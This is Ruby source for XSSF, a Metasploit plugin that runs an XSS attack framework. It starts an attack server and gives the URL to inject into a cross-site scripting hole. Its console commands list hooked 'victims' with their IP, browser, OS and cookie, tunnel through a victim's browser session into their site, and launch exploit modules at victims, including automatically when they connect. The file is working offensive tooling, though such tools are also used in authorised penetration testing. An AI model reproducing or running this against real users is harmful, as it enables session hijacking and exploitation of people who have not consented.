module Msf

	# This plugin manages a new XSS framework integrated to Metasploit
	class Plugin::Xssf < Msf::Plugin
		include Msf::Xssf::XssfMaster
		
		#
		# Called when an instance of the plugin is created.
		#
		def initialize(framework, opts)
			super

			clean_database;	Msf::Xssf::AUTO_ATTACKS.clear

			@DefaultPort = Msf::Xssf::SERVER_PORT;		@DefaultUri  = Msf::Xssf::SERVER_URI;		@DefaultDebug	=	false;	

			# Check if parameters are correct if entered
			opts['ServerPort'].to_s =~ /^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$/ ? port = opts['ServerPort'] : port = @DefaultPort
			opts['ServerUri'].to_s  =~ /^\/?([a-zA-Z0-9\-\._\?\,\'\/\\\+&amp;%\$#\=~])+$/ ? uri = opts['ServerUri'].to_s : uri = @DefaultUri
			opts['DebugMode'].to_s  =~ /^true$/ ? Msf::Xssf::XSSF_DEBUG_MODE[0] = true : Msf::Xssf::XSSF_DEBUG_MODE[0] = @DefaultDebug
			
			uri = '/' + uri if (uri[0].chr  != "/")
			uri = uri + '/' if (uri[-1].chr != "/")
			
			if (not framework.db.active)	# Removing SQLITE3 support as default DB (from previous XSSF version), user must connect manually
				print_error("The database backend has not been initialized ...")
				print_status("Please connect MSF to an installed database before loading XSSF !")
				raise PluginLoadError.new("Failed to connect to the database.")
			end

			framework.plugins.each { |p| raise PluginLoadError.new("This plugin should not be loaded more than once") if (p.class == Msf::Plugin::Xssf)	}
			
			begin
				raise "Database Busy..." if not start(port, uri)
				add_console_dispatcher(ConsoleCommandDispatcher)
				print_line("%cya" + Xssf::XssfBanner.to_s + "%clr\n\n")
				print_good("Server started : http://#{Rex::Socket.source_address('1.2.3.4')}:#{port}#{uri}\n")
				print_status("Please, inject '#{"http://#{Rex::Socket.source_address('1.2.3.4')}:#{port}#{uri}"}loop' or '#{"http://<PUBLIC-IP>:#{port}#{uri}loop"}' resource in an XSS")

				print_error("Your ruby version is #{RUBY_VERSION.to_s}. Recommended version is 1.9.2 or higher!") unless (RUBY_VERSION.to_s =~ /^1\.9/)
			rescue
				raise PluginLoadError.new("Error starting server : #{$!}")
			end
		end

		#
		# Removes the console menus created by the plugin
		#
		def cleanup
			stop
			remove_console_dispatcher('xssf')
		end
		
		#
		# This method returns a short, friendly name for the plugin.
		#
		def name
			"xssf"
		end

		#
		# Returns description of the plugin (60 chars max)
		#
		def desc
			"XSS Framework managing XSS modules"
		end


		# This class implements a sample console command dispatcher.
		class ConsoleCommandDispatcher
			include Msf::Ui::Console::CommandDispatcher
			include Msf::Xssf::XssfMaster

			#
			# The dispatcher's name.
			#
			def name
				"xssf"
			end

			#
			# Commands supported by this dispatcher.
			#
			def commands
				{
					# INFORMATION COMMANDS
					"xssf_victims"   			=> "Displays all victims",
					"xssf_active_victims"  		=> "Displays active victims",
					"xssf_information"			=> "Displays information about a given victim",
					"xssf_servers"   			=> "Displays all used attack servers",
					
					# XSSF GUI HTML COMMANDS
					"xssf_logs"					=> "Exports attacks logs page",
					"xssf_stats"				=> "Exports real time statistics page",
					"xssf_help"					=> "Exports XSSF help page",
					"xssf_set_public"			=> "Set public access authorized or not for GUI pages",
					
					# NON-XSSF MODULES ATTACKS
					"xssf_tunnel"   			=> "Do a tunnel between attacker and victim",
					"xssf_exploit"				=> "Launches a launched module (running in jobs) on a given victim",
					
					# AUTOMATED ATTACKS COMMANDS
					"xssf_add_auto_attack"  	=> "Add a new automated attack (launched automatically at victim's connection)",
					"xssf_remove_auto_attack"	=> "Remove an automated attack",
					"xssf_auto_attacks"			=> "Displays XSSF automated attacks",
					
					# DATABASE COMMANDS
					"xssf_remove_victims"		=> "Remove victims in database",
					"xssf_clean_victims"		=> "Clean victims in database (delete waiting attacks)",
					
					# OTHERS
					"xssf_test"					=> "Opens a new test page",
					"xssf_banner"				=> "Prints XSS Framework banner !"
				}
			end

			def cmd_xssf_exploit(*args)
				url = nil 
				begin
					raise "Wrong arguments : [JobID] must be an Integer." unless (args[-1].to_s =~ /^([0-9]+)$/)
				
					print_status("Searching Metasploit launched module with JobID = '#{args[-1].to_s}'...")
					
					# Watching if jobID is an running module
					if (obj = framework.jobs[args[-1]])
						print_good("A running exploit exists : '#{obj.name}'")
						datastore = obj.ctx[0].datastore
						url = "http://#{Rex::Socket.source_address('1.2.3.4')}:#{datastore['SRVPORT']}#{obj.ctx[0].get_resource}"
						process_victims_string((args[0..-2] * ' ').gsub(/\s*/, ''), "attack_victim", url, obj.name)
					else
						raise "No Metasploit launched module was found... Please run one first or check JobID parameter !"
					end
					
					print_status("Exploit execution started, press [CTRL + C] to stop it !") 
					
					puts ""; attacked_victims
					# Loop and wait for console interruption
					while (true) do; Rex::ThreadSafe.sleep(5); end;
						
				rescue ::Interrupt
					print_error("Exploit interrupted by the console user")
				rescue ::Exception
					print_error("#{$!}")
					print_error("Wrong arguments : xssf_exploit [VictimIDs] [JobID]")
					print_error("Use MSF 'jobs' command to see running jobs")
				end
			end

			def cmd_xssf_tunnel(*args)
				if (args.length == 1)
					begin
						raise "Wrong arguments : [VictimID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)

						victim = tunnel_victim(args[0])		
						
						raise "Victim #{args[0].to_s} does not exist or is no longer active" if not victim
						raise "Victim has 'Unknown' location in database" if (victim.location == "Unknown")

						uri = URI.parse(URI.escape(CGI::unescape(victim.location)))
				
						print_status("Creating new tunnel with victim '#{args[0].to_s}' (#{uri.scheme}://#{uri.host}:#{uri.port}) ...")
						print_status("You can now add XSSF Server as your browser proxy and visit domain of victim '#{args[0].to_s}' ! ;-)\n")
						print_status("NOTE : Other HTTP domains are also accessible through XSSF Tunnel, but user session won't be available\n")
						
						if (uri.scheme == 'https')
							print_status("IMPORTANT : Victim domain is HTTPs! Please use HTTP protocol instead (example: #{uri.scheme}://#{uri.host}:#{uri.port} => http://#{uri.host}/)")
						end

						while (victim_tunneled) do; 	Rex::ThreadSafe.sleep(5);	end
							
						raise "Victim #{args[0].to_s} is no longer active"

					rescue ::Interrupt
						print_error("Tunnel interrupted by the console user")
					rescue ::Exception
						print_error("#{$!}")
					end
					
					clean_victim(args[0])
					print_status("Removing tunnel with victim #{args[0].to_s} ...")
				else
					print_error("Wrong arguments : cmd_xssf_tunnel_victim [VictimID]")
				end
			end
			
			def cmd_xssf_information(*args)
				# Check if victim ID is correct if one is entered
				if (args.length == 1)
					print_error("Wrong arguments : [VictimID] must be an Integer") unless (args[0].to_s =~ /^([0-9]+)$/)
					
					victim = get_victim(args[0])
					
					if (victim)
						secs = (victim.last_request - victim.first_request).to_i;
						
						print_line
						print_line "INFORMATION ABOUT VICTIM #{args[0]}"
						print_line "============================"
						print_line "IP ADDRESS \t: #{victim.ip}"
						print_line "ACTIVE ? \t: #{victim.active ? "TRUE" : "FALSE"}"
						print_line "FIRST REQUEST \t: #{victim.first_request}"
						print_line "LAST REQUEST \t: #{victim.last_request}"
						print_line "CONNECTION TIME : #{secs/3600 % 24}hr #{secs/60 % 60}min #{secs % 60}sec"
						print_line "BROWSER NAME \t: #{victim.browser_name}"
						print_line "BROWSER VERSION : #{victim.browser_version}"
						print_line "OS NAME\t\t: #{victim.os_name}"
						print_line "OS VERSION \t: #{victim.os_version}"
						print_line "ARCHITECTURE \t: #{victim.arch}"
						print_line "LOCATION \t: #{victim.location}"
						print_line "XSSF COOKIE ?\t: #{victim.cookie}"
						print_line "RUNNING ATTACK \t: #{victim.current_attack_url ? victim.current_attack_url : "NONE"}"
						print_line "WAITING ATTACKS : #{count_waiting_attacks(args[0]).to_s}"
					else
						print_error("Error getting victim '#{args[0]}'!")
					end
					

				else
					print_error("Wrong arguments : cmd_xssf_information [VictimID]")
				end
			end

			
			def cmd_xssf_auto_attacks(*args)
				print_good("Automated attacks :")
				Msf::Xssf::AUTO_ATTACKS.each do |a|
					if (framework.jobs[a])
						puts "\t * #{a} - #{framework.jobs[a].name}"
					else
						puts "\t * Job #{a} is no longuer active... please remove it !"
					end
				end
				
				puts "\t * NONE" if Msf::Xssf::AUTO_ATTACKS.empty?
			end
			
			
			def cmd_xssf_add_auto_attack(*args)	
				if (args.length == 1)	
					raise "Wrong arguments : [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
				
					print_status("Searching Metasploit launched module with JobID = '#{args[0].to_s}'...")
						
					# Watching if jobID is an running module
					if (framework.jobs[args[0]])
						Msf::Xssf::AUTO_ATTACKS << args[0] if not Msf::Xssf::AUTO_ATTACKS.include?(args[0])
						print_good("Job '#{args[0]}' added to automated attacks")
					else
						print_error("No Metasploit launched module was found... Please run one first or check JobID parameter !")
					end
				else
					print_error("Wrong arguments : cmd_xssf_add_auto_attack [JobID]")
					print_error("Use MSF 'jobs' command to see running jobs")
				end
			end
			
			
			def cmd_xssf_remove_auto_attack(*args)	
				if (args.length == 1)	
					raise "Wrong arguments : [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
				
					Msf::Xssf::AUTO_ATTACKS.delete(args[0])
					print_good("Job '#{args[0]}' removed from automated attacks")
				else
					print_error("Wrong arguments : cmd_xssf_remove_auto_attack [JobID]")
					print_error("Use MSF 'jobs' command to see running jobs")
				end
			end

			
			def cmd_xssf_logs(*args)
				Thread.new do
					print "\n"; print_status("Opening in browser '#{active_server + Msf::Xssf::VICTIM_GUI + "?"+ Msf::Xssf::PARAM_GUI_PAGE}=main' ...")
					Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_GUI + "?#{Msf::Xssf::PARAM_GUI_PAGE}=main") if not (args[0].to_s =~ /^false$/i)
				end
			end
			
			
			def cmd_xssf_stats(*args)
				Thread.new do
					print "\n"; print_status("Opening in browser '#{active_server + Msf::Xssf::VICTIM_GUI + "?"+ Msf::Xssf::PARAM_GUI_PAGE}=stats' ...")
					Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_GUI + "?#{Msf::Xssf::PARAM_GUI_PAGE}=stats") if not (args[0].to_s =~ /^false$/i)
				end
			end
			
			
			def cmd_xssf_help(*args)
				Thread.new do
					print "\n"; print_status("Opening in browser '#{active_server + Msf::Xssf::VICTIM_GUI + "?"+ Msf::Xssf::PARAM_GUI_PAGE}=help' ...")
					Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_GUI + "?#{Msf::Xssf::PARAM_GUI_PAGE}=help") if not (args[0].to_s =~ /^false$/i)
				end
			end
			
			def cmd_xssf_set_public(*args)
				Msf::Xssf::XSSF_FROM_OUTSIDE[0] = ((args[0].to_s =~ /^true$/i) ? true : false)
			end
			

			def cmd_xssf_test(*args)
				Thread.new do
					print "\n"; print_status("Opening in browser '#{active_server + Msf::Xssf::VICTIM_TEST}' ...")
					Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_TEST)
				end
			end
			
			def cmd_xssf_remove_victims	(*args);	process_victims_string((args * ' ').gsub(/\s*/, ''), "remove_victim", nil, nil);																																																end;
			def cmd_xssf_clean_victims	(*args);	process_victims_string((args * ' ').gsub(/\s*/, ''), "clean_victim", nil, nil);																																																	end;
			def cmd_xssf_banner			(*args);	print_line("%cya" + Xssf::XssfBanner.to_s + "%clr\n\n");																																																						end;
			def cmd_xssf_servers		(*args);	show_table("Servers", DBManager::XssfServer);																																																									end;
			def cmd_xssf_victims		(*args);	show_table("Victims", DBManager::XssfVictim, ["1 = 1"], ["first_request", "last_request", "tunneled", "current_attack_url", "location", "os_name", "os_version", "arch"]);				print_status("Use xssf_information [VictimID] to see more information about a victim");	end;
			def cmd_xssf_active_victims	(*args);	show_table("Victims", DBManager::XssfVictim, ["active = ?", true], ["first_request", "last_request", "tunneled", "current_attack_url", "location", "os_name", "os_version", "arch"]); 	print_status("Use xssf_information [VictimID] to see more information about a victim");	end;
		end
		
	protected
	end
end